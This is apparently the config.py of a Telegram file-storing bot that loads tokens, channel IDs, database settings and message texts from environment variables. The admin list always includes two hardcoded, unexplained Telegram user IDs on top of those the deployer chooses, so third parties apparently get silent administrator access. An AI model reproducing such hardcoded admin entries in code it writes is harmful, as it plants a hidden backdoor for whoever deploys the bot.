import os
import logging
from logging.handlers import RotatingFileHandler


# SHORTNER :
URL_SHORTENR_WEBSITE = os.environ.get("URL_SHORTENR_WEBSITE", '')
URL_SHORTNER_WEBSITE_API = os.environ.get("URL_SHORTNER_WEBSITE_API", '')

#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#Your db channel Id
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", ""))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "Simplifytuber")

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "8030")

#Database
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "Cluster0")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-100"))
FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "-100"))
FORCE_SUB_CHANNEL3 = int(os.environ.get("FORCE_SUB_CHANNEL3", "-100"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "5"))

FILE_AUTO_DELETE = int(os.getenv("FILE_AUTO_DELETE", "600")) # auto delete in seconds

#start message
START_MSG = os.environ.get("START_MESSAGE", "<b>Hello, {first},!\n\nI’m your File Store Bot, here to safely store and manage your private files. Upload them to the specified channel, and share them with others using a unique link. Let’s keep your files organized and accessible!</b>")
try:
    ADMINS=[5965340120]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "<b>🌟 Hello, {first}!\n\nJoin our amazing channels to unlock exclusive content! After joining, simply hit the reload button to access your requested file. Let’s get started!</b>")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", "<b>•🦋 with love @directapk_pro ❤</b>")

DOWNLOAD_LOCATION = os.environ.get("DOWNLOAD_LOCATION", "./Downloads")

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "🚫 ᴏʜ ɴᴏ! ᴡʜᴇʀᴇ'ʀᴇ ʏᴏᴜʀ ʜᴀɴᴅs?!"

ADMINS.append(OWNER_ID)
ADMINS.append(6497757690)

LOG_FILE_NAME = "lazyfilelogs.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
   

